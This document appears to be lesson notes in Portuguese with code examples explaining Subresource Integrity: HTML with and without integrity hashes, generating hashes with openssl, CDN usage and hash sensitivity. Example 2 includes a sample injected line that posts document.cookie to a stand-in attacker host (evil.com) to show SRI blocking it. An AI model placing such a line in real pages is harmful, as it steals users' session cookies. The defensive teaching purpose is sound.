# Code Examples: Subresource Integrity (SRI)

## Exemplo 1: Setup basico demonstrado na aula

### Estrutura de arquivos

```
subresource-integrity/
├── index.html
├── script.js
└── favicon.ico
```

### script.js (recurso sendo protegido)

```javascript
console.log("Hello World");
```

### index.html sem SRI (vulneravel)

```html
<!DOCTYPE html>
<html>
<head>
  <title>SRI Demo</title>
</head>
<body>
  <script src="script.js"></script>
</body>
</html>
```

### index.html com SRI (protegido)

```html
<!DOCTYPE html>
<html>
<head>
  <title>SRI Demo</title>
</head>
<body>
  <script
    src="script.js"
    integrity="sha256-FCawcxYmEaG8VLHC0pfnuB7ZKaANdQFN5YKHQ3MRYnQ="
    crossorigin="anonymous"
  ></script>
</body>
</html>
```

## Exemplo 2: Comportamento quando o arquivo e modificado

Se alguem modifica o `script.js` adicionando codigo malicioso:

```javascript
console.log("Hello World");
// codigo injetado por atacante:
fetch('https://evil.com/steal', { method: 'POST', body: document.cookie });
```

O navegador exibe no console:

```
Failed to find a valid digest in the 'integrity' attribute for resource '...'
with computed SHA-256 integrity 'sha256-XnV...'. The resource has been blocked.
```

O script NAO e executado. A funcionalidade quebra, mas o codigo malicioso tambem nao roda.

## Exemplo 3: Truque pratico para obter o hash

O instrutor mostrou um truque pratico:

1. Coloque um hash falso propositalmente:
```html
<script src="script.js" integrity="sha256-000" crossorigin="anonymous"></script>
```

2. Carregue a pagina e abra o console do navegador

3. O navegador mostra o hash correto na mensagem de erro:
```
... with computed SHA-256 integrity 'sha256-FCawcxYmEaG8...'
```

4. Copie o hash correto e substitua no atributo integrity

**Quando usar:** durante desenvolvimento, quando voce acabou de escrever/auditar o script e sabe que ele esta integro.

## Exemplo 4: Gerando hash via linha de comando

```bash
# SHA-256
echo -n "$(cat script.js)" | openssl dgst -sha256 -binary | openssl base64 -A
# Output: FCawcxYmEaG8VLHC0pfnuB7ZKaANdQFN5YKHQ3MRYnQ=

# SHA-384 (recomendado)
cat script.js | openssl dgst -sha384 -binary | openssl base64 -A

# SHA-512
cat script.js | openssl dgst -sha512 -binary | openssl base64 -A
```

## Exemplo 5: Uso real com CDN popular

```html
<!-- Bootstrap via CDN com SRI -->
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
  integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7icsOerno4iUnHVsT6piTGA3iB3E6/TYv/F"
  crossorigin="anonymous"
/>

<script
  src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
  integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
  crossorigin="anonymous"
></script>
```

## Exemplo 6: Multiplos hashes (fallback)

```html
<!-- Navegador usa o mais forte que suporta -->
<script
  src="https://cdn.example.com/lib@1.0.0/lib.min.js"
  integrity="sha256-abc123... sha384-def456... sha512-ghi789..."
  crossorigin="anonymous"
></script>
```

## Exemplo 7: Demonstracao da propriedade avalanche

O instrutor demonstrou ao vivo que adicionar um unico espaco ao arquivo muda completamente o hash:

```
Arquivo original:     console.log("Hello World");
Hash:                 sha256-FCawcxYmEaG8VLHC0pfnuB7ZKaANdQFN5YKHQ3MRYnQ=

Arquivo + 1 espaco:   console.log("Hello World"); 
Hash:                 sha256-XnV8qK... (completamente diferente)
```

Isso prova que nao existe modificacao "pequena demais" para escapar do SRI.